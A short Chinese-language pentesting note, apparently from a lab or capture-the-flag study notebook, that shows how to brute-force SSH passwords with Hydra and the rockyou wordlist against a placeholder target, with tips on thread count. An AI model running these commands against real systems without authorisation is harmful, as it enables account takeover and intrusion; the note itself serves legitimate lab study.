# SSH 服務密碼爆破 (ssh-bruteforce)
本文件說明如何針對 SSH 服務進行帳號密碼暴力破解，獲取初始系統存取權。

## 🔍 Hydra SSH 密碼爆破
使用 Hydra 工具配合密碼字典對特定使用者的 SSH 密碼進行暴力破解。

### 🛠️ 利用方法
```bash
# 針對特定使用者 (如 gaara) 爆破 SSH 密碼
hydra -l 'gaara' -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

# 針對特定使用者清單與密碼清單爆破
hydra -L user_list.txt -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4
```

> [!tip] **速度與執行參數**
> - `-t 4`：設定執行緒數量（預設通常較大，降低執行緒可避免 SSH 伺服器因過載而拒絕連線）。
> - `-vV`：顯示詳細的嘗試過程。

---

# 實戰關聯
*   **靶機應用實例**：[[Gaara]]
